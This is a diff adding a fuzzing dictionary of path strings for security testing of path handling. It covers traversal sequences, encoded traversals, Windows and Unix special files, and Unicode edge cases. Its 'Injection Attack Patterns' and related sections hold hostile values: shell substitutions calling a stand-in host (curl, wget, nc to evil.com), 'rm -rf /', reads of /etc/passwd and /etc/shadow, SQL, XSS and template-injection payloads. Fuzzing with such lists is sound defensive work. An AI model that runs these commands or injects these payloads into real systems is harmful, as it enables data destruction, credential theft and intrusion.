@@ -1,0 +1,344 @@
+# Enhanced Path Dictionary for Fuzzing
+# Comprehensive file path patterns for path handling and security testing
+
+# Path Separators
+"/"
+"\\"
+"//"
+"\\\\"
+"/\\"
+"\\/"
+
+# Path Traversal Patterns
+"../"
+"..\\"
+"../../"
+"..\\..\\"
+"../../../"
+"..\\..\\..\\"
+"../../../../"
+"..\\..\\..\\..\\"
+"../../../../../"
+"..\\..\\..\\..\\..\\"
+
+# Current Directory
+"./"
+".\\"
+"././"
+".\\.\\"
+
+# Parent Directory
+"../"
+"..\\"
+".../"
+"...\\"
+
+# Root Paths
+"/"
+"\\"
+"C:"
+"C:\\"
+"D:"
+"D:\\"
+"/root"
+"/home"
+"/etc"
+"/usr"
+"/var"
+"/tmp"
+"/dev"
+"\\Windows"
+"\\System32"
+"\\Program Files"
+
+# Hidden Files
+"."
+".hidden"
+".config"
+".env"
+".git"
+".gitignore"
+".npmignore"
+".DS_Store"
+"._"
+".Trashes"
+".fseventsd"
+".DocumentRevisions-V100"
+
+# Special Files
+"con"
+"prn"
+"aux"
+"nul"
+"com1"
+"lpt1"
+"/dev/null"
+"/dev/zero"
+"/dev/random"
+"/proc/self"
+"/proc/self/environ"
+"/etc/passwd"
+"/etc/shadow"
+"/etc/hosts"
+
+# File Extensions
+".txt"
+".json"
+".xml"
+".html"
+".js"
+".ts"
+".py"
+".rb"
+".php"
+".jsp"
+".asp"
+".exe"
+".dll"
+".so"
+".dylib"
+".jar"
+".war"
+".zip"
+".tar"
+".gz"
+".rar"
+".7z"
+".pdf"
+".doc"
+".docx"
+".xls"
+".xlsx"
+".ppt"
+".pptx"
+
+# Directory Names
+"node_modules"
+".git"
+"src"
+"lib"
+"dist"
+"build"
+"bin"
+"sbin"
+"etc"
+"var"
+"tmp"
+"cache"
+"logs"
+"config"
+"conf"
+"settings"
+"data"
+"uploads"
+"downloads"
+"backup"
+
+# Long Path Components
+"verylongfilename"
+"directorywithverylongname"
+"component_with_underscores"
+"component-with-dashes"
+"component.with.dots"
+"component with spaces"
+"UPPERCASE"
+"lowercase"
+"MiXeDcAsE"
+
+# Unicode in Paths
+"测试"
+"файл"
+"文件"
+"📁"
+"🔒"
+"⚠️"
+
+# Null Bytes and Control Characters
+"\x00"
+"\x01"
+"\x1f"
+"\x7f"
+"\n"
+"\r"
+"\t"
+
+# Invalid Characters
+"<"
+">"
+":"
+"\""
+"|"
+"?"
+"*"
+"\x00"
+"\x01"
+"\x02"
+
+# UNC Paths
+"\\\\server\\share"
+"\\\\localhost\\c$"
+"\\\\127.0.0.1\\share"
+"\\\\::1\\share"
+
+# Relative Path Variations
+"../"
+"./../"
+".././"
+"../.././"
+"./../../"
+".././../"
+"../.././../"
+
+# URL Encoded Paths
+"%2e%2e%2f"
+"%2e%2e%5c"
+"%2f"
+"%5c"
+"%00"
+"%01"
+
+# Very Long Path Components
+"verylongpathnamethatmightcauseissueswhenprocessing"
+"extremelylongdirectorynamethatcouldcausebufferoverflows"
+"thisisareallyreallyreallyreallyreallyreallyreallyreallyreallyreallyreallyreallyreallyreallyreallyreallyreallyreallylongpathname"
+
+# Injection Attack Patterns
+"'; DROP TABLE users; --"
+"\" UNION SELECT * FROM secrets --"
+"| cat /etc/passwd"
+"; rm -rf /"
+"&& echo 'hacked'"
+"`cat /etc/passwd`"
+"$(cat /etc/passwd)"
+"$(id)"
+"$(whoami)"
+"$(pwd)"
+"$(env)"
+"$(curl http://evil.com)"
+"$(wget http://evil.com)"
+"$(nc evil.com 4444)"
+
+# XSS in Paths
+"<script>alert('xss')</script>"
+"\"<script>alert('xss')</script>"
+"'><script>alert('xss')</script>"
+"\"><img src=x onerror=alert('xss')>"
+"\"><iframe src=\"javascript:alert('xss')\">"
+"javascript:alert('xss')"
+"vbscript:msgbox('xss')"
+"data:text/html,<script>alert('xss')</script>"
+
+# Template Injection
+"{{config.items()}}"
+"{{self.__dict__}}"
+"{{7*7}}"
+"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
+"{{''.__class__.__mro__[2].__subclasses__()[40]('etc/passwd').read()}}"
+
+# Windows Registry Paths
+"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
+"HKLM\\SYSTEM\\CurrentControlSet\\Services"
+"HKCU\\Environment"
+
+# Environment Variable Paths
+"%APPDATA%"
+"%LOCALAPPDATA%"
+"%TEMP%"
+"%TMP%"
+"%USERPROFILE%"
+"%HOMEDRIVE%%HOMEPATH%"
+"%SystemRoot%"
+"%ProgramFiles%"
+"%ProgramFiles(x86)%"
+
+# IPv6 and Special Network Paths
+"::1"
+"2001:db8::1"
+"fe80::1%lo0"
+"localhost"
+"127.0.0.1"
+"0.0.0.0"
+"255.255.255.255"
+
+# Alternative Data Stream (Windows)
+":$DATA"
+":Zone.Identifier"
+":encryptable"
+":$ATTRIBUTE_LIST"
+
+# Compressed and Sparse Files
+":$COMPRESSED"
+":$SPARSE"
+":$ENCRYPTED"
+
+# Extended Length Paths (Windows)
+"\\?\C:\very\long\path\that\exceeds\MAX_PATH\limit\and\requires\special\handling"
+"\\?\UNC\server\share\very\long\path\name"
+
+# Relative Path Edge Cases
+".././.././../../etc/passwd"
+"../.././../../etc/passwd"
+"../../.././../../etc/passwd"
+"../../../.././../../etc/passwd"
+"../../../../.././../../etc/passwd"
+
+# Path with Mixed Separators
+"/path\\with/mixed\\separators"
+"\\path/with\\mixed/separators"
+"C:/path\\with/mixed/separators"
+
+# Unicode Normalization Issues
+"ñ"
+"n\u0303"
+"ä"
+"a\u0308"
+"é"
+"e\u0301"
+
+# Right-to-Left Override
+"\u202E"
+"\u202ESPOOFED_FILENAME"
+"\u202E\u2066\u2069"
+
+# Homoglyph Attacks
+"а"  # Cyrillic 'a'
+"е"  # Cyrillic 'e'
+"о"  # Cyrillic 'o'
+"р"  # Cyrillic 'p'
+"с"  # Cyrillic 'c'
+"у"  # Cyrillic 'u'
+"х"  # Cyrillic 'x'
+
+# Zero Width Characters
+"\u200B"  # Zero Width Space
+"\u200C"  # Zero Width Non-Joiner
+"\u200D"  # Zero Width Joiner
+"\uFEFF"  # Zero Width No-Break Space
+
+# Control Characters in Various Positions
+"normal\u0000file"
+"file\u0001name"
+"path\u0002with\u0003control"
+"test\u0004file\u0005.txt"
+"data\u0006file\u0007.bin"
+
+# Mixed Encoding Issues
+"%2e%2e%2fetc%2fpasswd"
+"%2e%2e%5cwindows%5csystem32%5cconfig%5csam"
+"..%2f..%2f..%2fetc%2fpasswd"
+"..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"
+
+# Double Encoding
+"%252e%252e%252fetc%252fpasswd"
+"%252e%252e%255cwindows%255csystem32%255cconfig%255csam"
+
+# Overlong UTF-8
+"\xc0\xaf"  # Overlong "/"
+"\xc1\x9c"  # Overlong "\\"
+
+# Surrogate Halves
+"\ud800"  # High surrogate half
+"\udc00"  # Low surrogate half
+"\ud800\udc00"  # Valid surrogate pair
+"\ud800\ud800"  # Invalid surrogate pair
